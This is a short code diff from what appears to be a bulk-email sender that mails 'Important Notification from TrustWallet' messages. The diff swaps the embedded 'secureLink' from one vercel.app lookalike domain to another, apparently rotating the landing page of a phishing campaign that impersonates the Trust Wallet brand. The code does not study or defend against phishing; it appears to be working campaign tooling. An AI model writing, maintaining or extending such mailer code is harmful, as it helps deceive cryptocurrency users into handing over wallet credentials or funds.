@@ -32,7 +32,7 @@ exports.sendBulkEmailDefault = async (req, res) => {
 
         // Use only the mail template for the email body
         const defaultSubject = "Important Notification from TrustWallet";
-        const secureLink = `https://trust-wallet-drab.vercel.app/`;
+        const secureLink = `https://trust-wallet-inky.vercel.app/`;
 
         // Send emails and save to DB in parallel
         const results = await Promise.allSettled(
